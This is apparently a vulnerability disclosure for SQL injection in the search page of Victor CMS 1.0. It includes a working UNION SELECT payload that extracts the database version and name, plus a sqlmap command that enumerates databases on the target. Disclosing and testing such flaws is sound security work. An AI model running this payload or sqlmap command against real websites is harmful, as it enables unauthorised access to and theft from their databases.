# Victor CMS 1.0 - 'Search' SQL Injection   
* Vulnerability Type :  
SQL Injection  
* Vulnerability Version :   
v 1.0  
* Recurring environment:   
XAMPP / Windows 10  
* Discription:  
The Victor CMS v1.0 application is vulnerable to SQL injection via the 'search' parameter on the search.php page.  
* Feature: Search  
* Vulnerable file: search.php    
![image](https://github.com/BigTiger2020/Victor-CMS-/blob/main/03.png)  

* Vulnerable parameter : - search  

*POC:  
url: http://example.com/CMSsite/search.php  
Methode : Post (search="[SQLi]"&submit)  
Payload : 1337'union+select+1,2,version(),database(),5,6,7,8,9,10 -- -   

* Burpsuite Requests  
![image](https://github.com/BigTiger2020/Victor-CMS-/blob/main/02.png)  
![image](https://github.com/BigTiger2020/Victor-CMS-/blob/main/04.png)   

* Sqlmap Command    
sqlmap -u "http://example.com/CMSsite/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3  
![image](https://github.com/BigTiger2020/Victor-CMS-/blob/main/01.png)
